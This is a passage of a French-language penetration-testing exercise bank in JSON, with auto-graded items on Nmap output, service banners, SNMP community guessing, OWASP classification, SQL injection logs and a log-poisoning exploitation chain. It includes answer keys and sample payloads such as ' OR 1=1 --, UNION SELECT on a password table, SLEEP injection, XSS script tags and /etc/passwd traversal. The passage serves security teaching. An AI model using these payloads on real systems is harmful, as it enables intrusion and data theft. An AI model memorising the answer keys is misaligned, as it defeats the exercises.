        "expected": "SUBDOMAIN_GROUP: domain=wildcard-all.net total=3 meme_ip=3 noms_meme=a.wildcard-all.net,b.wildcard-all.net,c.wildcard-all.net autre_ip=0 noms_autres=NONE"
      },
      {
        "label": "Adresses mélangées et ordre alphabétique",
        "stdin": "cas:3",
        "expected": "SUBDOMAIN_GROUP: domain=cloud.dev total=4 meme_ip=1 noms_meme=bogus.cloud.dev autre_ip=3 noms_autres=auth.cloud.dev,gitlab.cloud.dev,monitor.cloud.dev"
      }
    ],
    "solution": "[Exemple]\nSUBDOMAIN_GROUP: domain=example.com total=4 meme_ip=2 noms_meme=fake99.example.com,testabc.example.com autre_ip=2 noms_autres=admin.example.com,mail.example.com\n\n[Cas 1 — Aucune adresse témoin]\nSUBDOMAIN_GROUP: domain=corp.org total=2 meme_ip=0 noms_meme=NONE autre_ip=2 noms_autres=api.corp.org,vpn.corp.org\n\n[Cas 2 — Trois réponses à la même adresse]\nSUBDOMAIN_GROUP: domain=wildcard-all.net total=3 meme_ip=3 noms_meme=a.wildcard-all.net,b.wildcard-all.net,c.wildcard-all.net autre_ip=0 noms_autres=NONE\n\n[Cas 3 — Adresses mélangées et ordre alphabétique]\nSUBDOMAIN_GROUP: domain=cloud.dev total=4 meme_ip=1 noms_meme=bogus.cloud.dev autre_ip=3 noms_autres=auth.cloud.dev,gitlab.cloud.dev,monitor.cloud.dev\n",
    "takeaway": "À retenir : Regrouper des réponses DNS sans conclure à la légitimité des noms.\nRepère : Les deux listes sont des regroupements, pas des verdicts sur les noms."
  },
  {
    "id": "hk3-c3-e1",
    "chapter": 3,
    "level": "n1",
    "language": "analyse",
    "title": "Le scan Nmap autorisé du serveur de la scierie Dumoulin",
    "exampleTitle": "Exemple résolu — le scan du serveur de la boulangerie Lemieux",
    "goal": "Lire un résultat Nmap : compter les ports ouverts, identifier les services et distinguer filtré et fermé.",
    "brief": "<p><strong>Énoncé.</strong> La scierie Dumoulin confie à l'ESN Cortège le test d'intrusion de son serveur d'hébergement interne, <code>10.20.30.5</code>, depuis le réseau de test prévu au contrat. L'auditeur lance <code>nmap -sV 10.20.30.5</code> et obtient l'extrait suivant :</p><table><tr><th>Port</th><th>État</th><th>Service et version</th></tr><tr><th>22/tcp</th><td>open</td><td>ssh — OpenSSH 8.9p1</td></tr><tr><th>80/tcp</th><td>open</td><td>http — Apache httpd 2.4.54</td></tr><tr><th>443/tcp</th><td>open</td><td>https — Apache httpd 2.4.54</td></tr><tr><th>3306/tcp</th><td>filtered</td><td>mysql — filtré par le pare-feu</td></tr><tr><th>8080/tcp</th><td>closed</td><td>http-proxy — aucun service</td></tr></table><ol><li>Combien de ports sont à l'état « open » ?</li><li>Quel service écoute sur le port 22 ?</li><li>Quel est l'état du port 3306 ?</li><li>Combien de ports ne sont pas ouverts (fermés ou filtrés) ?</li><li>Quelle version d'Apache le scan révèle-t-il ?</li><li>Comment se nomme le type de scan Nmap qui établit une connexion TCP complète, utilisable sans privilèges root mais peu furtif ?</li></ol>",
    "starter": "# Exercice — Le scan Nmap autorisé du serveur de la scierie Dumoulin\n# Lisez l'énoncé complet ci-dessus, puis répondez à chaque question dans son bloc.\n# Questions 1 à 5 : un nombre, un mot ou une version. Question 6 : le nom d'un scan.\n\n[Question 1 — Ports à l'état open]\nA_COMPLETER\n\n[Question 2 — Service écoutant sur le port 22]\nA_COMPLETER\n\n[Question 3 — État du port 3306]\nA_COMPLETER\n\n[Question 4 — Ports non ouverts (fermés ou filtrés)]\nA_COMPLETER\n\n[Question 5 — Version d'Apache révélée]\nA_COMPLETER\n\n[Question 6 — Scan Nmap établissant une connexion TCP complète]\nA_COMPLETER\n",
    "hints": [
      "Parcourez la colonne « État » : open, filtered et closed ne racontent pas la même histoire (service joignable, pare-feu silencieux, port vide).",
      "Un port filtré ne répond pas franchement au scanner : c'est souvent un pare-feu qui laisse la requête sans réponse.",
      "Le scan furtif de référence (-sS) n'achève pas la poignée de main TCP ; celui qui l'achève s'appelle tout simplement « connect »."
    ],
    "examples": [
      {
        "stdin": "La boulangerie Lemieux fait auditer son serveur 10.0.5.21. Extrait de nmap -sV :\n21/tcp open ftp vsftpd 3.0.5 ; 22/tcp open ssh OpenSSH 9.2 ; 80/tcp open http nginx 1.25 ;\n443/tcp filtered https ; 3306/tcp closed mysql.\n\n1) 3 ports ouverts. 2) Le service du port 21 est ftp. 3) Le port 443 est filtré.\n4) 2 ports non ouverts. 5) nginx 1.25. 6) Le scan complet s'appelle le scan connect.",
        "expected": "3 ports ouverts — ftp sur 21 — filtré — 2 non ouverts — nginx 1.25 — scan connect",
        "note": "Le port 3306 fermé chez Dumoulin et filtré chez Lemieux traduisent deux réalités différentes : absence de service devant un refus franc, ou pare-feu muet."
      }
    ],
    "tests": [
      {
        "label": "Question 1 — Ports à l'état open",
        "stdin": "q:1",
        "expected": "3||trois"
      },
      {
        "label": "Question 2 — Service du port 22",
        "stdin": "q:2",
        "expected": "ssh||le ssh||SSH"
      },
      {
        "label": "Question 3 — État du port 3306",
        "stdin": "q:3",
        "expected": "filtré||filtered||filtre"
      },
      {
        "label": "Question 4 — Ports non ouverts",
        "stdin": "q:4",
        "expected": "2||deux"
      },
      {
        "label": "Question 5 — Version d'Apache",
        "stdin": "q:5",
        "expected": "2.4.54||2,4,54||apache 2.4.54"
      },
      {
        "label": "Question 6 — Scan TCP complet",
        "stdin": "q:6",
        "expected": "connect||le scan connect||scan connect||sT||-sT"
      }
    ],
    "solution": "[Question 1 — Ports à l'état open]\n3\n\n[Question 2 — Service écoutant sur le port 22]\nssh\n\n[Question 3 — État du port 3306]\nfiltré\n\n[Question 4 — Ports non ouverts (fermés ou filtrés)]\n2\n\n[Question 5 — Version d'Apache révélée]\n2.4.54\n\n[Question 6 — Scan Nmap établissant une connexion TCP complète]\nconnect",
    "takeaway": "1) Trois ports sont ouverts : 22, 80 et 443.\n2) Le port 22 fait écouter le service ssh (OpenSSH 8.9p1).\n3) Le port 3306 est filtré : un pare-feu laisse la requête sans réponse franche.\n4) Deux ports ne sont pas ouverts : 3306 (filtré) et 8080 (fermé).\n5) Le scan révèle Apache httpd 2.4.54, une version à confronter aux bases de vulnérabilités.\n6) Le scan connect (-sT) établit une connexion TCP complète ; il ne demande pas de privilèges root mais se voit facilement dans les journaux.\nContrôle : 3 ports ouverts + 2 ports non ouverts = 5 lignes du tableau, l'inventaire est complet."
  },
  {
    "id": "hk3-c3-e2",
    "chapter": 3,
    "level": "n2",
    "language": "analyse",
    "title": "Les bannières obsolètes du serveur de recette de DevFan",
    "exampleTitle": "Exemple résolu — les bannières du serveur de la mairie de Fressin",
    "goal": "Comparer les bannières de services aux versions stables pour chiffrer l'exposition aux failles connues.",
    "brief": "<p><strong>Énoncé.</strong> L'agence DevFan fait auditer son serveur de recette, isolé de la production, dans le cadre d'un test d'intrusion contracté. L'auditeur collecte les bannières des services et les compare aux dernières versions stables :</p><table><tr><th>Service</th><th>Bannière relevée</th><th>Version stable</th><th>Faille connue sur la version</th></tr><tr><th>SSH</th><td>OpenSSH 7.4p1</td><td>9.6p1</td><td>Énumération d'utilisateurs</td></tr><tr><th>FTP</th><td>vsftpd 2.3.4</td><td>3.0.5</td><td>Porte dérobée menant à une exécution de code</td></tr><tr><th>SMB</th><td>Samba 3.0.20</td><td>4.19.0</td><td>Exécution de commande à distance</td></tr><tr><th>HTTP</th><td>nginx 1.25.3</td><td>1.25.3</td><td>Aucune connue</td></tr></table><ol><li>Combien de services tournent sur une version obsolète ?</li><li>Quel service est à jour ?</li><li>Combien de services obsolètes exposent une exécution de code à distance ?</li><li>Quelle version de Samba est en service ?</li><li>Quel protocole de partage de fichiers, historiquement lié à Windows, est concerné ?</li><li>Quelle option de Nmap exécute les scripts NSE de détection de vulnérabilités ?</li></ol>",
    "starter": "# Exercice — Les bannières obsolètes du serveur de recette de DevFan\n# Lisez l'énoncé complet ci-dessus, puis répondez à chaque question dans son bloc.\n# Questions 1, 3 : un nombre. Question 2, 5 : un service. Question 4 : une version. Question 6 : une option.\n\n[Question 1 — Services en version obsolète]\nA_COMPLETER\n\n[Question 2 — Service à jour]\nA_COMPLETER\n\n[Question 3 — Services obsolètes avec exécution de code]\nA_COMPLETER\n\n[Question 4 — Version de Samba en service]\nA_COMPLETER\n\n[Question 5 — Protocole de partage de fichiers concerné]\nA_COMPLETER\n\n[Question 6 — Option Nmap des scripts de vulnérabilités]\nA_COMPLETER\n",
    "hints": [
      "Comparez colonne « Bannière relevée » et colonne « Version stable » : un service est à jour quand les deux coïncident.",
      "Ne comptez que les failles qui mènent à une exécution de code : l'énumération d'utilisateurs est gênante mais n'exécute rien.",
      "Le protocole de partage de fichiers de l'écosystème Windows porte un sigle de trois lettres ; les scripts NSE de vulnérabilités se lancent avec l'option --script vuln."
    ],
    "examples": [
      {
        "stdin": "La mairie de Fressin audite son serveur. Bannières relevées :\nSSH OpenSSH 8.2 (stable 9.6 — énumération d'utilisateurs) ;\nFTP vsftpd 3.0.5 (stable 3.0.5 — aucune) ;\nSMB Samba 4.17 (stable 4.19 — exécution de commande à distance) ;\nHTTP Apache 2.4.49 (stable 2.4.58 — traversée de chemin).\n\n1) 3 services obsolètes. 2) Le FTP est à jour. 3) 1 seul service expose une exécution de commande (Samba).\n4) Samba 4.17. 5) SMB. 6) --script vuln.",
        "expected": "3 obsolètes — FTP à jour — 1 exécution de commande — Samba 4.17 — SMB — --script vuln",
        "note": "La traversée de chemin d'Apache n'est pas une exécution de code : le compte des risques critiques doit rester strict."
      }
    ],
    "tests": [
      {
        "label": "Question 1 — Services obsolètes",
        "stdin": "q:1",
        "expected": "3||trois"
      },
      {
        "label": "Question 2 — Service à jour",
        "stdin": "q:2",
        "expected": "nginx||http||le service http||le http"
      },
      {
        "label": "Question 3 — Services avec exécution de code à distance",
        "stdin": "q:3",
        "expected": "2||deux"
      },
      {
        "label": "Question 4 — Version de Samba",
        "stdin": "q:4",
        "expected": "3.0.20||3,0,20||samba 3.0.20"
      },
      {
        "label": "Question 5 — Protocole de partage de fichiers",
        "stdin": "q:5",
        "expected": "smb||SMB||le smb"
      },
      {
        "label": "Question 6 — Option Nmap des scripts de vulnérabilités",
        "stdin": "q:6",
        "expected": "--script vuln||script vuln||vuln||l'option vuln"
      }
    ],
    "solution": "[Question 1 — Services en version obsolète]\n3\n\n[Question 2 — Service à jour]\nnginx\n\n[Question 3 — Services obsolètes avec exécution de code]\n2\n\n[Question 4 — Version de Samba en service]\n3.0.20\n\n[Question 5 — Protocole de partage de fichiers concerné]\nsmb\n\n[Question 6 — Option Nmap des scripts de vulnérabilités]\n--script vuln",
    "takeaway": "1) Trois services sont obsolètes : OpenSSH 7.4p1 (stable 9.6p1), vsftpd 2.3.4 (stable 3.0.5) et Samba 3.0.20 (stable 4.19.0).\n2) nginx 1.25.3 coïncide avec la version stable : c'est le seul service à jour.\n3) Deux services obsolètes exposent une exécution de code à distance : vsftpd 2.3.4 (porte dérobée) et Samba 3.0.20.\n4) La version de Samba en service est 3.0.20.\n5) Samba implémente SMB, le protocole de partage de fichiers historiquement lié à Windows.\n6) L'option --script vuln exécute les scripts NSE de détection de vulnérabilités.\nContrôle : 4 services audités − 1 à jour = 3 obsolètes, dont 2 avec exécution de code et 1 avec énumération d'utilisateurs : le compte est cohérent."
  },
  {
    "id": "hk3-c3-e3",
    "chapter": 3,
    "title": "Recherche simulée dans une liste de communautés SNMP",
    "level": "n3",
    "language": "analyse",
    "goal": "Comparer des chaînes fictives sans conclure au niveau de sécurité d’un service.",
    "brief": "<p>Dans cette simulation, comparer successivement les chaînes de <code>wordlist</code> à <code>target_community</code> et arrêter à la première correspondance. Le résultat ne prouve pas qu’un service réel est sûr, compromis ou qu’un niveau de risque particulier s’applique ; d’autres configurations et contrôles doivent être examinés. Toute vérification réelle exige une autorisation.</p><p>Données : <code>SNMP_TEST target=&lt;ip&gt; wordlist=&lt;liste&gt; target_community=&lt;chaine&gt; target_perm=&lt;RO|RW&gt; sys_descr=&lt;description&gt;</code>.<br>Si trouvée : <code>SNMP_AUDIT: target=&lt;ip&gt; status=TROUVEE matched_community=&lt;chaine&gt; perm=&lt;RO|RW&gt; attempts=&lt;n&gt; risk=NON_EVALUE sys_descr=&lt;description&gt;</code>.<br>Sinon : <code>SNMP_AUDIT: target=&lt;ip&gt; status=NON_TROUVEE attempts=&lt;n&gt; risk=NON_EVALUE</code>.</p>",
    "starter": "# Grille d'analyse (hk3-c3-e3) — Recherche simulée dans une liste de communautés SNMP\n# Complétez la réponse attendue sous chaque cas ci-dessous :\n\n[Cas 1 — Correspondance au troisième essai]\n# Données : SNMP_TEST target=10.0.0.254 wordlist=public,cisco,private,switch target_community=private target_perm=RW sys_descr=Juniper_EX4300\nA_COMPLETER\n\n[Cas 2 — Aucune correspondance dans la liste]\n# Données : SNMP_TEST target=172.16.1.1 wordlist=public,private,secret target_community=complex_snmp_9821 target_perm=RO sys_descr=Linux_Router\nA_COMPLETER\n\n[Cas 3 — Correspondance au deuxième essai]\n# Données : SNMP_TEST target=192.168.100.10 wordlist=manager,monitor,operator target_community=monitor target_perm=RO sys_descr=HP_ProCurve\nA_COMPLETER\n",
    "hints": [
      "Compter les essais jusqu’à la première correspondance, ou toute la liste si aucune chaîne ne correspond.",
      "Ne déduire aucun risque global du seul résultat.",
      "Balayez la liste fournie et signalez uniquement les chaînes de communauté présentes ; l absence ou présence dans cette liste fictive ne suffit pas à auditer un hôte."
    ],
    "examples": [
      {
        "stdin": "SNMP_TEST target=192.168.1.1 wordlist=public,private,cisco,admin target_community=public target_perm=RO sys_descr=Cisco_IOS_Software_C2960",
        "expected": "SNMP_AUDIT: target=192.168.1.1 status=TROUVEE matched_community=public perm=RO attempts=1 risk=NON_EVALUE sys_descr=Cisco_IOS_Software_C2960",
        "note": "La première chaîne correspond dans ce scénario fictif ; les droits réels ne sont pas évalués."
      }
    ],
    "tests": [
      {
        "label": "Correspondance au troisième essai",
        "stdin": "cas:1",
        "expected": "SNMP_AUDIT: target=10.0.0.254 status=TROUVEE matched_community=private perm=RW attempts=3 risk=NON_EVALUE sys_descr=Juniper_EX4300"
      },
      {
        "label": "Aucune correspondance dans la liste",
        "stdin": "cas:2",
        "expected": "SNMP_AUDIT: target=172.16.1.1 status=NON_TROUVEE attempts=3 risk=NON_EVALUE"
      },
      {
        "label": "Correspondance au deuxième essai",
        "stdin": "cas:3",
        "expected": "SNMP_AUDIT: target=192.168.100.10 status=TROUVEE matched_community=monitor perm=RO attempts=2 risk=NON_EVALUE sys_descr=HP_ProCurve"
      }
    ],
    "solution": "[Exemple]\nSNMP_AUDIT: target=192.168.1.1 status=TROUVEE matched_community=public perm=RO attempts=1 risk=NON_EVALUE sys_descr=Cisco_IOS_Software_C2960\n\n[Cas 1 — Correspondance au troisième essai]\nSNMP_AUDIT: target=10.0.0.254 status=TROUVEE matched_community=private perm=RW attempts=3 risk=NON_EVALUE sys_descr=Juniper_EX4300\n\n[Cas 2 — Aucune correspondance dans la liste]\nSNMP_AUDIT: target=172.16.1.1 status=NON_TROUVEE attempts=3 risk=NON_EVALUE\n\n[Cas 3 — Correspondance au deuxième essai]\nSNMP_AUDIT: target=192.168.100.10 status=TROUVEE matched_community=monitor perm=RO attempts=2 risk=NON_EVALUE sys_descr=HP_ProCurve\n",
    "takeaway": "À retenir : Comparer des chaînes fictives sans conclure au niveau de sécurité d’un service.\nRepère : La première chaîne correspond dans ce scénario fictif ; les droits réels ne sont pas évalués."
  },
  {
    "id": "hk3-c4-e1",
    "chapter": 4,
    "level": "n1",
    "language": "analyse",
    "title": "Le classement OWASP du site de l'association Vél'Eau",
    "exampleTitle": "Exemple résolu — le bug bounty du club GrimpeMax",
    "goal": "Classer quatre observations de bug bounty dans les catégories de l'OWASP Top 10.",
    "brief": "<p><strong>Énoncé.</strong> L'association Vél'Eau, qui gère un atelier de réparation de vélos en ligne, ouvre son site vel-eau.org à un programme de bug bounty. Le chasseur de primes consigne quatre observations :</p><table><tr><th>Obs.</th><th>Comportement constaté</th></tr><tr><th>A</th><td>En changeant le numéro dans <code>facture.php?id=1042</code>, on affiche la facture d'un autre adhérent</td></tr><tr><th>B</th><td>Le champ de recherche affiche le terme saisi, exécuté comme du JavaScript par le navigateur du visiteur</td></tr><tr><th>C</th><td>Le formulaire de connexion accepte <code>' OR 1=1 --</code> et ouvre une session sans mot de passe</td></tr><tr><th>D</th><td>L'URL <code>?page=../../../../etc/passwd</code> affiche un fichier du serveur</td></tr></table><ol><li>Combien d'observations décrivent des vulnérabilités distinctes ?</li><li>Quelle catégorie OWASP couvre l'observation C ?</li><li>Quelle catégorie couvre l'observation B ?</li><li>Comment se nomme la faille de l'observation A, où l'on accède à la ressource d'un autre utilisateur ?</li><li>Quelle observation illustre une traversée de répertoire ?</li></ol>",
    "starter": "# Exercice — Le classement OWASP du site de l'association Vél'Eau\n# Lisez l'énoncé complet ci-dessus, puis répondez à chaque question dans son bloc.\n# Question 1 : un nombre. Questions 2 à 4 : le nom d'une catégorie. Question 5 : une lettre.\n\n[Question 1 — Vulnérabilités distinctes relevées]\nA_COMPLETER\n\n[Question 2 — Catégorie OWASP de l'observation C]\nA_COMPLETER\n\n[Question 3 — Catégorie OWASP de l'observation B]\nA_COMPLETER\n\n[Question 4 — Nom de la faille de l'observation A]\nA_COMPLETER\n\n[Question 5 — Observation illustrant la traversée de répertoire]\nA_COMPLETER\n",
    "hints": [
      "Chaque ligne du tableau décrit un mécanisme différent : accès à la facture d'autrui, code exécuté par le navigateur, requête SQL manipulée, fichier système lu.",
      "Le guillemet suivi de OR 1=1 manipule une requête de base de données ; un champ qui exécute le texte saisi comme du JavaScript relève du cross-site scripting.",
      "Accéder à l'objet d'un autre utilisateur en changeant un identifiant dans l'URL porte un sigle de quatre lettres ; la lecture de /etc/passwd par des « ../ » est une traversée de répertoire."
    ],
    "examples": [
      {
        "stdin": "Le club d'escalade GrimpeMax ouvre son site au bug bounty. Observations :\nA : le paramètre membre.php?id=308 affiche le profil d'un autre membre ;\nB : la recherche accepte une requête SQL et renvoie toute la table des adhérents ;\nC : le livre d'or exécute le message laissé comme du JavaScript ;\nD : le paramètre download?fiche=../../secret.txt livre un fichier du serveur.\n\n1) 4 vulnérabilités distinctes. 2) L'observation B est une injection SQL. 3) L'observation C est un XSS.\n4) L'observation A est un IDOR. 5) L'observation D est une traversée de répertoire.",
        "expected": "4 vulnérabilités — B : injection SQL — C : XSS — A : IDOR — D : traversée de répertoire",
        "note": "Le sigle IDOR (Insecure Direct Object Reference) désigne la déclinaison la plus courante des défaillances de contrôle d'accès."
      }
    ],
    "tests": [
      {
        "label": "Question 1 — Vulnérabilités distinctes",
        "stdin": "q:1",
        "expected": "4||quatre"
      },
      {
        "label": "Question 2 — Catégorie de l'observation C",
        "stdin": "q:2",
        "expected": "injection sql||l'injection sql||injection||sql injection"
      },
      {
        "label": "Question 3 — Catégorie de l'observation B",
        "stdin": "q:3",
        "expected": "xss||cross-site scripting||le xss"
      },
      {
        "label": "Question 4 — Faille de l'observation A",
        "stdin": "q:4",
        "expected": "idor||l'idor||contrôle d'accès défaillant||broken access control||défaillance de contrôle d'accès"
      },
      {
        "label": "Question 5 — Observation de la traversée de répertoire",
        "stdin": "q:5",
        "expected": "d||la d||l'observation d"
      }
    ],
    "solution": "[Question 1 — Vulnérabilités distinctes relevées]\n4\n\n[Question 2 — Catégorie OWASP de l'observation C]\ninjection sql\n\n[Question 3 — Catégorie OWASP de l'observation B]\nxss\n\n[Question 4 — Nom de la faille de l'observation A]\nidor\n\n[Question 5 — Observation illustrant la traversée de répertoire]\nd",
    "takeaway": "1) Les quatre observations décrivent quatre vulnérabilités distinctes.\n2) L'observation C est une injection SQL : la chaîne ' OR 1=1 -- ferme la requête légitime et rend la condition toujours vraie.\n3) L'observation B est un XSS (cross-site scripting) : le terme saisi est exécuté comme du JavaScript par le navigateur du visiteur.\n4) L'observation A est un IDOR : changer l'identifiant dans l'URL donne accès à la facture d'un autre adhérent, faute de contrôle d'accès côté serveur.\n5) L'observation D illustre la traversée de répertoire : la séquence ../../../../ remonte l'arborescence jusqu'à /etc/passwd.\nContrôle : injection SQL, XSS, IDOR et traversée de répertoire forment quatre familles distinctes de l'OWASP Top 10, aucune observation ne chevauche une autre."
  },
  {
    "id": "hk3-c4-e2",
    "chapter": 4,
    "level": "n2",
    "language": "analyse",
    "title": "Le journal d'attaques du portail santé Mylifeline",
    "exampleTitle": "Exemple résolu — le journal du portail Biblioweb",
    "goal": "Lire un journal de requêtes d'injection SQL, compter les tentatives et confirmer la faille par le temps de réponse.",
    "brief": "<p><strong>Énoncé.</strong> Lors d'un test d'intrusion autorisé du portail santé Mylifeline, l'auditeur envoie une série de requêtes sur le champ de recherche. Le journal du serveur en garde la trace :</p><table><tr><th>Heure</th><th>Requête</th><th>Code HTTP</th><th>Durée</th></tr><tr><th>10:02</th><td><code>/recherche?q=sac+de+voyage</code></td><td>200</td><td>0,1 s</td></tr><tr><th>10:05</th><td><code>/recherche?q=' OR 1=1--</code></td><td>200</td><td>0,1 s</td></tr><tr><th>10:07</th><td><code>/recherche?q=gourde</code></td><td>200</td><td>0,1 s</td></tr><tr><th>10:09</th><td><code>/recherche?q=' UNION SELECT login, mot_de_passe FROM utilisateurs--</code></td><td>200</td><td>0,2 s</td></tr><tr><th>10:11</th><td><code>/recherche?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></td><td>200</td><td>0,1 s</td></tr><tr><th>10:13</th><td><code>/recherche?q=' AND SLEEP(5)--</code></td><td>200</td><td>5,2 s</td></tr></table><ol><li>Combien de requêtes figurent dans cet extrait ?</li><li>Combien de tentatives d'injection SQL distinctes contient-il ?</li><li>Quel type d'injection repose sur le temps de réponse du serveur pour déduire des informations ?</li><li>La requête de 10:13 a duré 5,2 s : quel diagnostic l'auditeur peut-il poser sur la faille ?</li><li>Quel autre type d'attaque apparaît à 10:11 ?</li><li>Quel mot-clé SQL de la requête de 10:09 permet de concaténer les résultats d'une autre table ?</li></ol>",
    "starter": "# Exercice — Le journal d'attaques du portail santé Mylifeline\n# Lisez l'énoncé complet ci-dessus, puis répondez à chaque question dans son bloc.\n# Questions 1 et 2 : un nombre. Questions 3 à 6 : quelques mots.\n\n[Question 1 — Requêtes de l'extrait]\nA_COMPLETER\n\n[Question 2 — Tentatives d'injection SQL]\nA_COMPLETER\n\n[Question 3 — Type d'injection fondé sur le temps de réponse]\nA_COMPLETER\n\n[Question 4 — Diagnostic posé grâce à la durée de 5,2 s]\nA_COMPLETER\n\n[Question 5 — Autre type d'attaque à 10:11]\nA_COMPLETER\n\n[Question 6 — Mot-clé SQL concaténant une autre table]\nA_COMPLETER\n",
    "hints": [
      "Les injections SQL portent une apostrophe suivie d'un mot-clé SQL (OR, UNION, AND) : parcourez la colonne Requête ligne par ligne.",
      "Quand le serveur répond « normalement » mais que SLEEP(5) allonge la réponse de 5 secondes, la base a bien exécuté la commande injectée.",
      "Le mot-clé UNION SELECT ajoute les lignes d'une autre table aux résultats ; la balise script dans la requête de 10:11 relève, elle, du cross-site scripting."
    ],
    "examples": [
      {
        "stdin": "Test autorisé du portail Biblioweb ; journal du champ de recherche :\n14:02 q=roman policier (200, 0,2 s) ; 14:05 q=' OR '1'='1 (200, 0,2 s) ;\n14:08 q=bd (200, 0,2 s) ; 14:10 q=' UNION SELECT titre, isbn FROM livres-- (200, 0,3 s) ;\n14:12 q=<img src=x onerror=alert(1)> (200, 0,2 s) ; 14:15 q=' AND SLEEP(8)-- (200, 8,3 s).\n\n1) 6 requêtes. 2) 3 injections SQL. 3) La dernière est une injection aveugle basée sur le temps.\n4) La durée de 8,3 s confirme la faille. 5) L'attaque de 14:12 est un XSS. 6) Le mot-clé est UNION SELECT.",
        "expected": "6 requêtes — 3 injections SQL — aveugle basée sur le temps — faille confirmée — XSS — UNION SELECT",
        "note": "Un écart entre la durée demandée (SLEEP 8) et la durée observée (8,3 s) tient au traitement : l'essentiel est l'ordre de grandeur, pas la décimale."
      }
    ],
    "tests": [
      {
        "label": "Question 1 — Requêtes de l'extrait",
        "stdin": "q:1",
        "expected": "6||six"
      },
      {
        "label": "Question 2 — Tentatives d'injection SQL",
        "stdin": "q:2",
        "expected": "3||trois"
      },
      {
        "label": "Question 3 — Injection fondée sur le temps",
        "stdin": "q:3",
        "expected": "l'injection aveugle basée sur le temps||injection aveugle basée sur le temps||aveugle basée sur le temps||time-based blind||blind time-based||injection temporelle||l'injection temporelle"
      },
      {
        "label": "Question 4 — Diagnostic après 5,2 s",
        "stdin": "q:4",
        "expected": "confirmée||la faille est confirmée||que la faille est confirmée||la vulnérabilité est confirmée||confirmee||la faille est exploitée"
      },
      {
        "label": "Question 5 — Attaque à 10:11",
        "stdin": "q:5",
        "expected": "xss||cross-site scripting||le xss"
      },
      {
        "label": "Question 6 — Mot-clé SQL de concaténation",
        "stdin": "q:6",
        "expected": "union||union select||l'union select"
      }
    ],
    "solution": "[Question 1 — Requêtes de l'extrait]\n6\n\n[Question 2 — Tentatives d'injection SQL]\n3\n\n[Question 3 — Type d'injection fondé sur le temps de réponse]\nl'injection aveugle basée sur le temps\n\n[Question 4 — Diagnostic posé grâce à la durée de 5,2 s]\nconfirmée\n\n[Question 5 — Autre type d'attaque à 10:11]\nxss\n\n[Question 6 — Mot-clé SQL concaténant une autre table]\nunion",
    "takeaway": "1) L'extrait compte 6 requêtes, de 10:02 à 10:13.\n2) Trois tentatives d'injection SQL distinctes : à 10:05 (OR 1=1), 10:09 (UNION SELECT) et 10:13 (SLEEP).\n3) C'est l'injection aveugle basée sur le temps : le serveur ne renvoie pas les données, mais leur durée de réponse trahit le résultat.\n4) La requête SLEEP(5) a duré 5,2 s : la base a exécuté la commande, la faille est confirmée.\n5) La requête de 10:11, avec sa balise script, est une tentative de XSS.\n6) Le mot-clé UNION (UNION SELECT) concatène les lignes d'une autre table aux résultats de la requête légitime.\nContrôle : 6 requêtes − 3 injections SQL − 1 XSS = 2 requêtes de recherche légitimes (10:02 et 10:07), le compte du journal est cohérent."
  },
  {
    "id": "hk3-c4-e3",
    "chapter": 4,
    "level": "n3",
    "language": "analyse",
    "title": "De la lecture de fichiers au web shell : la chaîne d'exploitation d'Alpaga",
    "exampleTitle": "Exemple résolu — la chaîne d'exploitation de la recette Zéphyr",
    "goal": "Dérouler une chaîne d'exploitation complète : path traversal, log poisoning, exécution de code et remédiation.",
    "brief": "<p><strong>Énoncé.</strong> Alpaga, plateforme de vente de laine en ligne, commande un test d'intrusion à haute valeur. Partant d'une simple faille de lecture de fichiers, l'auditeur construit la chaîne d'exploitation suivante, chaque étape étant validée avec l'équipe sécurité d'Alpaga :</p><table><tr><th>Étape</th><th>Action</th><th>Résultat</th></tr><tr><th>1</th><td><code>index.php?page=../../../etc/passwd</code></td><td>Le fichier /etc/passwd s'affiche</td></tr><tr><th>2</th><td><code>index.php?page=../../../var/log/apache2/access.log</code></td><td>Les journaux du serveur sont lus</td></tr><tr><th>3</th><td>Requête dont l'en-tête User-Agent contient du code PHP</td><td>Le code est consigné dans le journal</td></tr><tr><th>4</th><td>Nouvelle inclusion du journal</td><td>Le code PHP du journal s'exécute</td></tr><tr><th>5</th><td>Dépôt d'un petit web shell dans l'arborescence web</td><td>Exécution de commandes persistante</td></tr></table><ol><li>Comment se nomme la vulnérabilité initiale qui permet d'afficher /etc/passwd ?</li><li>Quelle fonction PHP, alimentée par le paramètre page sans validation, est typiquement en cause ?</li><li>Quelle technique, qui fait exécuter le code injecté dans les journaux, transforme la lecture en exécution ?</li><li>Quel en-tête HTTP a servi de vecteur d'injection à l'étape 3 ?</li><li>Combien d'étapes séparent la découverte de la faille (étape 1) de la première exécution de code (étape 4) ?</li><li>Quelle remédiation consiste à ne charger que des pages figurant dans une liste de valeurs autorisées ?</li></ol>",
    "starter": "# Exercice — De la lecture de fichiers au web shell : la chaîne d'exploitation d'Alpaga\n# Lisez l'énoncé complet ci-dessus, puis répondez à chaque question dans son bloc.\n# Question 5 : un nombre. Autres questions : un terme technique ou un nom de fonction.\n\n[Question 1 — Nom de la vulnérabilité initiale]\nA_COMPLETER\n\n[Question 2 — Fonction PHP typiquement en cause]\nA_COMPLETER\n\n[Question 3 — Technique transformant la lecture en exécution]\nA_COMPLETER\n\n[Question 4 — En-tête HTTP vecteur de l'injection]\nA_COMPLETER\n\n[Question 5 — Étapes entre la faille et la première exécution]\nA_COMPLETER\n\n[Question 6 — Remédiation par liste de valeurs autorisées]\nA_COMPLETER\n",
    "hints": [
      "La faille initiale porte un nom anglais évoquant la traversée de l'arborescence ; en français on parle de traversée de répertoire, parfois d'inclusion de fichier local.",
      "Le paramètre page est passé à une fonction PHP qui charge un fichier ; les deux candidats de la même famille s'appellent include et require.",
      "Faire exécuter le code déposé dans un journal s'appelle l'empoisonnement des journaux (log poisoning) ; la remédiation par valeurs autorisées s'appelle une liste blanche."
    ],
    "examples": [
      {
        "stdin": "Sur la plateforme de recette de Zéphyr, même scénario :\n1) le paramètre template lit /etc/passwd ; 2) lecture de /var/log/nginx/error.log ;\n3) code PHP injecté via l'en-tête Referer ; 4) le journal inclus exécute le code ;\n5) un web shell est déposé.\n\n1) Faille initiale : path traversal. 2) Fonction en cause : include. 3) Technique : log poisoning.\n4) Vecteur : l'en-tête Referer. 5) 3 étapes avant la première exécution. 6) Remédiation : liste blanche.",
        "expected": "path traversal — include — log poisoning — Referer — 3 étapes — liste blanche",
        "note": "Le vecteur change (Referer au lieu de User-Agent) mais la chaîne est identique : lecture, dépôt, exécution."
      }
    ],
    "tests": [
      {
        "label": "Question 1 — Vulnérabilité initiale",
        "stdin": "q:1",
